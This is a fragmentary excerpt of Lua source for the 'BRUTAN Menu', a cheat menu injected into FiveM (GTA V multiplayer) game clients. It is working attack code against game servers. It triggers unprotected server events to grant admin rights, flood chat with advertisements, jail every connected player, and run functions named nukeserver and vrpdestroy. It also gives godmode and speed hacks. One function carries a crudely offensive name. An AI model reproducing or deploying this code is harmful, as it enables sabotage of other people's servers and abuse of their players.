...
else aM("~h~Read #news on BRUTAN Official Discord") end end;
local
...
function cG() for i = 0, 255 do x, y, z = table.unpack(GetEntityCoords(GetPlayerPed(i))) roundx = tonumber(string.format("%.2f", x)) roundy = tonumber(string.format("%.2f", y)) roundz = tonumber(string.format("%.2f", z)) while not HasModelLoaded(GetHashKey("prop_fnclink_05crnr1")) do Citizen.Wait(0) RequestModel(GetHashKey("prop_fnclink_05crnr1")) end;
    ...
    function bananapartyall() Citizen.CreateThread(function() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1BR^2U^3T^4AN ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
                141, 211, 255
            }, "^"..av..
            "BRUTAN on YouTube - Best FiveM Cheats") end;
...
function RapeAllFunc() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1B^2RUT^3A^4N ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
            141, 211, 255
        }, "^"..av..
        "BRUTAN on YouTube - Best FiveM Cheats") end;
...
Citizen.CreateThread(function() while bL do Citizen.Wait(0) SetPlayerInvincible(PlayerId(), Godmode) SetEntityInvincible(PlayerPedId(-1), Godmode) SetEntityVisible(GetPlayerPed(-1), dM, 0) if SuperJump
    ...
    if blowall then
    for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1BR^2UT^3A^4N ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
            141, 211, 255
        }, "^"..av..
        "BRUTAN on YouTube - Best FiveM Cheats") end;
    ...
    function vrpdestroy() for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1B^2RUT^3A^4N ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
            141, 211, 255
        }, "^"..av..
        "BRUTAN on YouTube - Best FiveM Cheats") end;
    ...
    function nukeserver() Citizen.CreateThread(function() local d_ = "Avenger"
        ...
        for av = 0, 9 do TriggerServerEvent("adminmenu:allowall") TriggerServerEvent("_chat:messageEntered", "^1B^2RU^3T^4AN ^5R^6e^7v^8o^9l^1u^2t^3i^5o^4n", {
                141, 211, 255
            }, "^"..av..
            "BRUTAN on YouTube - Best FiveM Cheats") end;
    ...
    if IsControlPressed(0, 38) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 250.0) elseif IsControlPressed(0, 38) then SetVehicleForwardSpeed(GetVehiclePedIsUsing(PlayerPedId(-1)), 0.0) end end;
    ...
    if e.IsMenuOpened(bM) then cr("~p~BRUTAN Menu - 9.0 - "..d, 0.80, 0.9) a5("Welcome back ~p~"..d..
        " ~s~!", 0.5, 0.5) aM("~h~BRUTAN Menu - ~g~9~s~.~g~0", true) aM("~u~s~BRUTAN on YouTube - Best FiveM Cheats~u~/", false) if e.MenuButton("~h~~p~#~s~ Self Menu", bO) then elseif e.MenuButton("~h~~p~#~s~ Online Players", bW) then elseif e.MenuButton("~h~~p~#~s~ Teleport Menu", bS) then elseif e.MenuButton("~h~~p~#~s~ Vehicle Menu", bV) then elseif e.MenuButton("~h~~p~#~s~ Weapon Menu", bT) then elseif e.MenuButton("~h~~p~#~s~ ---> BRUTAN Lua ~o~~h~", bQ) then elseif e.MenuButton("~h~~p~#~s~ ---> BEAST Mode ~o~~h~<3", bU) then elseif e.MenuButton("~h~~p~# ~y~BRUTAN Cheats", b_) then end; e.Display() elseif e.IsMenuOpened(bO) then a5("Stuff for yourself", 0.58, 0.58) if e.CheckBox("~h~~g~Godmode", Godmode, function(eC) Godmode = eC end) then elseif e.Button("~h~~y~Semi ~g~Godmode") then local eD = "stt_prop_stunt_soccer_ball"
    ...
    e.Display() elseif e.IsMenuOpened(b_) then a5(";)", 0.29, 0.29) if e.Button("~h~~p~#~s~ Brutan~r~#~r~7799 ~p~DEV") then aM("~h~~o~Dont click me BAKA!~s~.", false) aM("~h~~o~Nyaooww :3~s~.", false) aM("~h~~o~Very mad now cry qweqwe~s~.", false) elseif e.Button("~h~~p~#~s~ unknown~r~#~r~9496 ~p~DEV") then elseif e.Button("~h~~p~#~s~ antonio~r~#~r~3246 ~p~DEV") then end; e.Display() elseif e.IsMenuOpened(cq) then a5("Weapon list to give yourself", 0.58, 0.58) for eJ, eZ in pairs(bo) do
        if e.
    ...
    "BRUTAN Menu injected successfully!") end, false) RegisterCommand("lol", function(f3, f4, f5) haharip = true; bananapartyall() EconomyDy2() for i = 0, 128 do TriggerServerEvent("esx-qalle-jail:jailPlayer", GetPlayerServerId(i), 5000, "BRUTAN on YouTube - Best FiveM Cheats") TriggerServerEvent("esx_jailer:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("esx_jail:sendToJail", GetPlayerServerId(i), 45 * 60) TriggerServerEvent("js:jailuser", GetPlayerServerId(i), 45 * 60, "BRUTAN on YouTube - Best FiveM Cheats") TriggerServerEvent("ljail:jailplayer") end end, false) RegisterCommand("pk", function(f3, f4, f5) bL = false end, false)